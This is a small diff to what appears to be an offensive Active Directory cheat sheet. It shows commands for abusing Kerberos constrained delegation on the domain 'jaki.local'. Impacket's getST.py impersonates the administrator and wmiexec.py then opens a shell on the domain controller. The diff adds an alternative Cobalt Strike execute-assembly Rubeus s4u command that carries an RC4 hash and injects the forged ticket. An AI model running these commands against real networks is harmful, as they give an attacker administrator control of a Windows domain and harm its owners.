@@ -39,9 +39,11 @@ getST.py jaki.local/JAKI2 -dc-ip dc.jaki.local -impersonate administrator -spn w
 export KRB5CCNAME=administrator.ccache
 
 wmiexec.py dc.jaki.local -k
+```
 
-OR
+or just use cobalt strike function:
 
+```
 execute-assembly /tmp/Rubeus.exe s4u /user:JAKI2 /rc4:32ed87bdb5fdc5e9cba88547376818d4 /impersonateuser:administrator /msdsspn:cifs/dc.jaki.local /ptt
 ```
 
